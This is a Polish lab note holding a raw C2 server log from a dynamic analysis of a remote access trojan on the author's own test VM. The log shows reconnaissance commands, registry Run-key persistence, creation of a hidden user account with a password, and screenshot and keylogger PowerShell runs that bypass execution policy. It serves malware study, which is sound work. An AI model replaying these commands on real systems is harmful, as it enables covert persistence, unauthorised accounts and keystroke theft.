---
title: "Pełny log sesji C2 — RAT .57"
date: 2026-08-16
type: log
tags: [lab, rat, c2, log, dynamic-analysis]
---

# Pełny log sesji C2 (RAT .57)

Surowy log serwera C2 (/root/rat-c2/raw_c2_session.log) z dynamicznej analizy [[2026-08-16_dynamiczna_analiza_RAT_57]]. Notacja: **>> SENT** = komenda wysłana do agenta, **<<** = odpowiedź agenta.

```text
[00:40:22] C2 listening on 0.0.0.0:9999 (FIFO=/tmp/c2in.fifo)
[00:40:53] >> AGENT CONNECTED from 5.175.189.57:50206 (active=1)
[00:41:18] >> SENT: whoami
[00:41:18] << nt authority\system
[00:41:19] >> SENT: hostname
[00:41:19] << WIN-T5BVVHUNVJI
[00:41:21] >> SENT: ipconfig
[00:41:21] << 
[00:41:21] << Windows IP Configuration
[00:41:21] << 
[00:41:21] << 
[00:41:21] << Ethernet adapter Ethernet:
[00:41:21] << 
[00:41:21] <<    Connection-specific DNS Suffix  . : 
[00:41:21] <<    Link-local IPv6 Address . . . . . : fe80::fd52:7b9:8460:2518%4
[00:41:21] <<    IPv4 Address. . . . . . . . . . . : 5.175.189.57
[00:41:21] <<    Subnet Mask . . . . . . . . . . . : 255.255.255.0
[00:41:21] <<    Default Gateway . . . . . . . . . : 5.175.189.1
[00:41:22] >> SENT: ver
[00:41:22] << 
[00:41:22] << Microsoft Windows [Version 10.0.20348.587]
[00:41:34] >> SENT: systeminfo
[00:41:35] << 
[00:41:35] << Host Name:                 WIN-T5BVVHUNVJI
[00:41:35] << OS Name:                   Microsoft Windows Server 2022 Standard Evaluation
[00:41:35] << OS Version:                10.0.20348 N/A Build 20348
[00:41:35] << OS Manufacturer:           Microsoft Corporation
[00:41:35] << OS Configuration:          Standalone Server
[00:41:35] << OS Build Type:             Multiprocessor Free
[00:41:35] << Registered Owner:          Proxmox
[00:41:35] << Registered Organization:   
[00:41:35] << Product ID:                00454-40000-00001-AA946
[00:41:35] << Original Install Date:     8/13/2026, 2:41:05 PM
[00:41:35] << System Boot Time:          8/15/2026, 9:39:42 AM
[00:41:35] << System Manufacturer:       QEMU
[00:41:35] << System Model:              Standard PC (Q35 + ICH9, 2009)
[00:41:35] << System Type:               x64-based PC
[00:41:35] << Processor(s):              1 Processor(s) Installed.
[00:41:35] <<                            [01]: AMD64 Family 26 Model 68 Stepping 0 AuthenticAMD ~4292 Mhz
[00:41:35] << BIOS Version:              EFI Development Kit II / OVMF 3.20230228-4, 6/6/2023
[00:41:35] << Windows Directory:         C:\Windows
[00:41:35] << System Directory:          C:\Windows\system32
[00:41:35] << Boot Device:               \Device\HarddiskVolume1
[00:41:35] << System Locale:             en-us;English (United States)
[00:41:35] << Input Locale:              en-us;English (United States)
[00:41:35] << Time Zone:                 (UTC) Coordinated Universal Time
[00:41:35] << Total Physical Memory:     6,140 MB
[00:41:35] << Available Physical Memory: 3,801 MB
[00:41:35] << Virtual Memory: Max Size:  7,804 MB
[00:41:35] << Virtual Memory: Available: 5,326 MB
[00:41:35] << Virtual Memory: In Use:    2,478 MB
[00:41:35] << Page File Location(s):     C:\pagefile.sys
[00:41:35] << Domain:                    WORKGROUP
[00:41:35] << Logon Server:              N/A
[00:41:35] << Hotfix(s):                 3 Hotfix(s) Installed.
[00:41:35] <<                            [01]: KB5008882
[00:41:35] <<                            [02]: KB5011497
[00:41:35] <<                            [03]: KB5010523
[00:41:35] << Network Card(s):           1 NIC(s) Installed.
[00:41:35] <<                            [01]: Red Hat VirtIO Ethernet Adapter
[00:41:35] <<                                  Connection Name: Ethernet
[00:41:35] <<                                  DHCP Enabled:    No
[00:41:35] <<                                  IP address(es)
[00:41:35] <<                                  [01]: 5.175.189.57
[00:41:35] <<                                  [02]: fe80::fd52:7b9:8460:2518
[00:41:35] << Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
[00:41:52] >> SENT: dir C:\Users\Administrator\Desktop
[00:41:52] <<  Volume in drive C has no label.
[00:41:52] <<  Volume Serial Number is 2CDD-89DB
[00:41:52] << 
[00:41:52] <<  Directory of C:\Users\Administrator\Desktop
[00:41:52] << 
[00:41:52] << 08/16/2026  12:36 AM    <DIR>          .
[00:41:52] << 08/16/2026  12:34 AM    <DIR>          ..
[00:41:52] << 08/15/2026  04:04 AM             2,363 agent.py
[00:41:52] << 08/15/2026  03:21 AM               696 agent.spec
[00:41:52] << 08/16/2026  12:36 AM                 0 agent_err.txt
[00:41:52] << 08/16/2026  12:36 AM                 0 agent_out.txt
[00:41:52] << 08/14/2026  09:12 PM             1,055 API Monitor x64.lnk
[00:41:52] << 08/15/2026  03:06 AM    <DIR>          build
[00:41:52] << 08/15/2026  07:49 AM               775 Detect It Easy.lnk
[00:41:52] << 08/15/2026  03:21 AM    <DIR>          dist
[00:41:52] << 08/15/2026  07:49 AM               709 dnSpy.lnk
[00:41:52] << 08/13/2026  01:49 PM    <DIR>          exodus-extract
[00:41:52] << 08/13/2026  12:52 PM               721 exodus-onboard-status.txt
[00:41:52] << 08/13/2026  12:52 PM             5,153 exodus-onboard.ps1
[00:41:52] << 08/13/2026  12:52 PM    <DIR>          exodus-shots
[00:41:52] << 08/13/2026  12:43 PM             2,263 Exodus.lnk
[00:41:52] << 08/13/2026  02:29 PM        35,189,876 exodus_search.txt
[00:41:52] << 08/14/2026  09:12 PM               965 Ghidra.lnk
[00:41:52] << 08/13/2026  12:31 PM             2,308 Microsoft Edge.lnk
[00:41:52] << 08/14/2026  09:12 PM               888 PEStudio.lnk
[00:41:52] << 08/13/2026  02:35 PM           281,396 powershell-notatka.txt
[00:41:52] << 08/15/2026  07:46 AM               749 Process Explorer.lnk
[00:41:52] << 08/14/2026  09:12 PM               749 Procmon64.lnk
[00:41:52] << 08/13/2026  03:18 PM             3,030 terminal_history.txt
[00:41:52] << 08/13/2026  02:30 PM             9,596 terminal_log.txt
[00:41:52] << 08/13/2026  03:18 PM            28,726 terminal_output.txt
[00:41:52] << 08/13/2026  03:38 PM             3,394 terminal_transcript.txt
[00:41:52] << 08/13/2026  02:36 PM        13,677,916 unlock_found.txt
[00:41:52] << 08/14/2026  09:12 PM               974 Wireshark.lnk
[00:41:52] << 08/14/2026  09:12 PM               945 x32dbg.lnk
[00:41:52] << 08/14/2026  09:12 PM               945 x64dbg.lnk
[00:41:52] <<               25 File(s)     49,216,192 bytes
[00:41:52] <<                6 Dir(s)  115,156,746,240 bytes free
[00:41:55] >> SENT: net user
[00:41:55] << 
[00:41:55] << User accounts for \\
[00:41:55] << 
[00:41:55] << -------------------------------------------------------------------------------
[00:41:55] << Administrator            cloudbase-init           DefaultAccount           
[00:41:55] << Guest                    WDAGUtilityAccount       
[00:41:55] << The command completed with one or more errors.
[00:42:30] >> SENT: reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Agent /t REG_SZ /d C:\Users\Administrator\Desktop\dist\agent.exe /f
[00:42:30] << The operation completed successfully.
[00:42:32] >> SENT: reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
[00:42:32] << 
[00:42:32] << HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
[00:42:32] <<     SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
[00:42:32] <<     Agent    REG_SZ    C:\Users\Administrator\Desktop\dist\agent.exe
[00:42:34] >> SENT: net user ratdemo DemoPass2026 /add
[00:42:34] << The command completed successfully.
[00:42:37] >> SENT: net user ratdemo
[00:42:37] << User name                    ratdemo
[00:42:37] << Full Name                    
[00:42:37] << Comment                      
[00:42:37] << User's comment               
[00:42:37] << Country/region code          000 (System Default)
[00:42:37] << Account active               Yes
[00:42:37] << Account expires              Never
[00:42:37] << 
[00:42:37] << Password last set            8/16/2026 12:42:34 AM
[00:42:37] << Password expires             Never
[00:42:37] << Password changeable          8/16/2026 12:42:34 AM
[00:42:37] << Password required            Yes
[00:42:37] << User may change password     Yes
[00:42:37] << 
[00:42:37] << Workstations allowed         All
[00:42:37] << Logon script                 
[00:42:37] << User profile                 
[00:42:37] << Home directory               
[00:42:37] << Last logon                   Never
[00:42:37] << 
[00:42:37] << Logon hours allowed          All
[00:42:37] << 
[00:42:37] << Local Group Memberships      *Users                
[00:42:37] << Global Group memberships     *None                 
[00:42:37] << The command completed successfully.
[00:44:11] >> SENT: powershell -ExecutionPolicy Bypass -File C:\Users\Administrator\Desktop\screenshot_57.ps1
[00:44:11] << SAVED screenshot_57.png size=3179 bytes
[00:44:11] << Exception calling "CopyFromScreen" with "3" argument(s): "The handle is invalid"
[00:44:11] << At C:\Users\Administrator\Desktop\screenshot_57.ps1:6 char:1
[00:44:11] << + $g.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $b ...
[00:44:11] << + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[00:44:11] <<     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
[00:44:11] <<     + FullyQualifiedErrorId : Win32Exception
[00:44:11] <<  
[00:44:27] >> SENT: powershell -ExecutionPolicy Bypass -File C:\Users\Administrator\Desktop\keylogger_57.ps1
[00:44:53] << keylogger done, file=89 bytes
```
